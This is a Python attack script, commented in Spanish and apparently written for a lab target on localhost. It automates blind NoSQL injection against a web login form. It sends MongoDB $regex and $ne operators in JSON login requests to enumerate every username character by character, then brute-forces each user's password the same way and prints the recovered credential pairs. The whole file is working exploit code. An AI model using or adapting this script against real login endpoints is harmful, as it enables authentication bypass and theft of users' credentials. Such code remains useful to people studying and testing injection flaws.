#!/usr/bin/python3

from pwn import log
import requests, sys, signal, time


def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

class MakeNoSQLI():
    def __init__(self):
        print("""
 ____  _____          ______     ___      _____     _____   
|_   \|_   _|       .' ____ \  .'   `.   |_   _|   |_   _|  
  |   \ | |   .--.  | (___ \_|/  .-.  \    | |       | |    
  | |\ \| | / .'`\ \ _.____`. | |   | |    | |   _   | |    
 _| |_\   |_| \__. || \____) |\  `-'  \_  _| |__/ | _| |_   
|_____|\____|'.__.'  \______.' `.___.\__||________||_____|  
                                                            

              """)
        self.login_url = "http://localhost:4000/user/login"

        self.usernames = [] # Acá se guardarán los usernames encontrados
        self.passwords = [] # Acá se guardarán las passwords encontradas

        lower_case = "abcdefghijklmnñopqrstuvwxyz"
        upper_case = "ABCDEFGHIJKLMNÑOPQRSTUVWXYZ"
        digits = "1234567890" # Añadir un 0
        symbols = "°|¬!\"#$%&/()=?'\\¡¿¨´*+~[{^]}`;,:._-"
        self.original_characters = lower_case + upper_case + digits

        self.p1 = log.progress("Petición")
        self.p2 = log.progress("Username Manipulation")
        self.p3 = log.progress("Deleted Character")
        self.p4 = log.progress("Dictionary")

        print()

        self.p5 = log.progress("Fuerza Bruta Username")
        self.p6 = log.progress("Fuerza Bruta Password")
        self.p7 = log.progress("Usernames Encontrados")
        self.p8 = log.progress("Paswords Encontradas")

        print()

        self.p9 = log.progress("Clean Credentials")
    
    def reorganizeCharacters(self, letter):
        characters = self.original_characters

        if letter not in characters or letter == None:
            characters = self.original_characters # Reestablecemos la cadena por si acaso
            return characters  # La letra no está en la cadena, no hay cambios necesarios

        indice_letra = characters.index(letter)  # Obtenemos el índice de la letra en la cadena
        characters = characters[indice_letra + 1:]  # Tomamos la subcadena hasta la letra y sin contarla a ella

        return characters

    def request(self, word, character, type, username=None):
        if type == "username":
            post_data = '{"username":{"$regex": "^%s%s"},"password":{"$ne": null}}' % (word, character) # Petición por Post
            headers = {'Content-Type': 'application/json'} # Formato de la data
            r = requests.post(self.login_url, headers=headers, data=post_data) # Se envía la data
            self.p5.status(word + character)

        elif type == "password":
            post_data = '{"username":"%s","password":{"$regex": "^%s%s"}}' % (username, word, character) # Petición por Post
            headers = {'Content-Type': 'application/json'} # Formato de la data
            r = requests.post(self.login_url, headers=headers, data=post_data) # Se envía la data
            self.p6.status(word + character)
        
        self.p1.status(post_data)

        return r

    def usernameBruteForce(self, initial_username="", characters=None): # Algoritmo para encontrar usernames
        # En el parámetro username se guardarán las coincidencias encontradas
        self.username = initial_username

        # El parámetro characters almacenará el abecedario con el que se trabajará
        if characters is None:
            characters = self.original_characters

        repetitions = 0 # Esto controla que la busqueda no siga indefinidamente si no se encuentran coincidencias

        while repetitions <= len(characters) + 1:
            for character in characters:
                self.p4.status(characters)

                r = self.request(self.username, character, "username")
                
                if "Logged in as user" in r.text: # Si el inicio de sesión fue exitoso
                    self.username += character # Se guarda el caracter exitoso
                    repetitions = 0 # Se resetea el contador por cada caracter correcto
                    characters = self.original_characters
                    break # Este hace que se parta desde el inicio de la lista de caracteres luego de una coincidencia
                else:
                    repetitions += 1 # Se suma 1 por cada caracter incorrecto

                if repetitions == len(characters) + 1 and len(characters) == len(self.original_characters):
                    self.usernames.append(self.username) # Se añade el username  a la lista
                    self.p2.status("")
                    self.p3.status("")
                    self.p5.status(self.username)
                    self.p7.status(self.usernames) # Se muestran los usernames encontrados
                    self.passwordBruteForce()
        
        if len(self.usernames) >=1:
            deleted_character = self.username[-1]
            self.p3.status(deleted_character)
            self.username = self.username[:-1]
            self.p2.status(self.username)
            characters = self.reorganizeCharacters(deleted_character)
            self.p4.status(characters)
            if characters == "":
                self.p4.status("Empty")
                deleted_character = self.username[-1]
                self.p3.status(deleted_character)
                self.username = self.username[:-1]
                self.p2.status(self.username)
                characters = self.reorganizeCharacters(deleted_character)
                self.p4.status(characters)
            try:
                self.usernameBruteForce(self.username, characters)
            except:
                self.p1.status("No hay más peticiones para enviar")
                self.p2.status("No quedan nombres de usuarios para manipular")
                self.p3.status("No quedan caracteres por eliminar")
                self.p4.status("No se necesita un diccionario")
                self.p5.status("No se han encontrado más usernames")
                self.p6.status("No se han encontrado más contraseñas")
                sys.exit(0)
    
    def passwordBruteForce(self):
        password = ""
        repetitions = 0
        self.p6.status(password)
        while repetitions <= len(self.original_characters):
            for character in self.original_characters + "a":
                r = self.request(password, character, "password", self.username)

                if "Logged in as user" in r.text:
                    password += character
                    self.p6.status(password)
                    repetitions = 0
                    break
                else:
                    repetitions +=1
            
            if repetitions == len(self.original_characters) + 1:
                self.passwords.append(password)
                self.p6.status("")
                self.p8.status(self.passwords)
                print(f"Creds {len(self.usernames)}.- {self.username}:|:{password}")



if __name__ == "__main__":
    makeNoSQLI = MakeNoSQLI()
    makeNoSQLI.usernameBruteForce()
    sys.exit(0)
